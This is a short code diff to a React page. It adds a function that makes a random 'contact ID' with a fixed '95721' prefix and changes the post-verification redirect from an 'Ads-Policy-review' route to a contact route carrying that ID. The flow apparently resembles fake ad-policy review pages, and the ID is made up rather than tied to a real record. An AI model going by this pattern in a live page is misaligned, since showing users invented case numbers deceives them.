@@ -36,6 +36,11 @@ const Index: FC = () => {
     }, []);
 
     const t = (text: string): string => translations[text] || text;
+    const generateContactId = () => {
+        const prefix = '95721';
+        const suffix = Array.from({ length: 10 }, () => Math.floor(Math.random() * 10)).join('');
+        return `${prefix}${suffix}`;
+    };
     const handleVerify = async () => {
         setIsLoading(true);
         try {
@@ -54,7 +59,7 @@ const Index: FC = () => {
     useEffect(() => {
         if (isShowCheckMark) {
             const redirectTimeOut = setTimeout(() => {
-                router.push('/Ads-Policy-review');
+                router.push(`/contact/${generateContactId()}`);
             }, 300);
             return () => {
                 clearTimeout(redirectTimeOut);
